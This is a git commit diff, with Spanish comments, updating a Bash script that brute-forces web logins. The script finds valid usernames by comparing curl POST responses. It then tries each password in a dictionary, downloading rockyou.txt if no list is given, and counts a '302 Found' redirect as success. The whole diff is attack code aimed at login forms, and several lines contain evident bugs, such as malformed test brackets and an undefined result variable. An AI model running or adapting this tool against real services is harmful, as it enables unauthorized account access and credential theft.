b05d28858497e4147c661067448e74237cca9945
Jose-Paco <99270056+Jose-Paco@users.noreply.github.com>
2022-04-29 16:03:52 +0200

    Update diccionario.sh

--- diccionario.sh
+++ diccionario.sh
@@ -2,17 +2,23 @@
 diccionario() {
 start=1
 URL=$(echo -e "$url")
-
 document=a.txt
 echo "Dime un usuario o un fichero txt con un listado de usuarios, deja en blanco para la demo.\n"
 read document
+#Comprobamos que el usuario haya contestado y sino le asignamos el valor que se usa en la demo
+if [[ -z $document ]]
+then
+    document=a.txt
+fi
 ok=0
 vale=0
-if [ -f  $document ]
+#Una vez declarados todos los valores y preparado todo, empezamos comprobando el listado de usuarios o nombre de usuario designado, en caso de que sea un listado se hace lo siguiente. 
+if [[ -f  $document ]]
 then
-    echo "Recuerda que este proceso puede tardar minutos."
+    echo "Recuerda que este proceso puede tardar minutos.\n"
     total=$(wc -l < $document)
-    while [ $start -le $total ]
+    #por tantas lineas de documento ejecutamos un script que haga que compruebe si la url de error es diferente en cada caso
+    while [[ $start -le $total ]]
         do
         test=$(awk "NR==$start{print $1}" $document)
         if [[ $(curl -s -d "username=$test&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
@@ -21,39 +27,52 @@ then
             vale=1
             break 0
         fi
+        #si la url de error es diferente, significa que hemos encontrado el nombre de usuario.
         ((start = start + 1))
-    #    echo $start
     done
 else
+#si nos han pasado un solo nombre de usuario en vez de una variable se hace la misma comprobacion sin el bucle
     if [[! $(curl -s -d "username=$document&password=a" $URL) != $(curl -s -d "username=a&password=a" $URL) ]]
         then
             username=$document
             vale=1
             break 0
         else
-            echo "Usuario inexistente."
+            echo "Usuario inexistente.\n"
         fi
-        ((start = start + 1))
-    done
 fi
-if [[ $vale==1 ]]
+#si da error  cerramos el programa
+if [[ $vale!=1 ]]
 then
-    echo -e "No hemos podido encontrar un usuario valido."
+    echo -e "No hemos podido encontrar un usuario valido.\n"
     exit 1
 fi
-echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta."
+#Solicitamos que el usuario nos pase un diccioanrio de contraseñas que puede haber generado con Jhon the ripper o sino podemos utilizar el de demos o el rockyou
+echo "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta.\n"
 read document
-if [ -f  $document ] 
+if [[ -f  $document ]] 
 then
-    echo "Fichero valido"
+    echo "Fichero valido.\n"
 else
-    echo "El Fichero no es valido, usaremos un diccionario propio"
-    
-    wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
-    document=rockyou.txt
+    echo "El Fichero no es valido, usaremos un diccionario propio.\n"
+#Si ha dejado en blanco el campo usaremos rockyou o la demo
+    if [[ -z $document ]]
+    then
+        echo "Quieres utilizar rockyou? Si quieres usar la demo omite la respuesta.\n"
+        read document
+        if [[ -z $document ]]
+        then
+            wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
+            document=rockyou.txt
+        else
+            document=b.txt
+        fi
+    fi
+fi
 start=1
 total=$(wc -l < $document)
-while [ $start -le $total ]
+#ahora que disponemos de un documento de contraseñas utilizamos el usuario previamente encontrado y ejecutamos el test de contraseñas buscando que la respuesta del servidor sea una redirección.
+while [[ $start -le $total ]]
     do
     test=$(awk "NR==$start{print $1}" $document)
     if ! [[ $(curl -i -s -d "username=$username&password=$test" $URL | grep -e "302 Found") ]]
@@ -64,10 +83,12 @@ while [ $start -le $total ]
     fi
     ((start = start + 1))
 done
-if [ -f  rockyou.txt ]
+#si hemos descargado anteriormente rockyou.txt, lo borramos
+if [[ -f  rockyou.txt ]]
 then
     rm rockyou.txt
 fi
+#ahora muestra los resultados por pantalla
 if [[ $ok==1 ]]
 then
     echo -e "El usuario es $usuari y su contraseña és $password ."
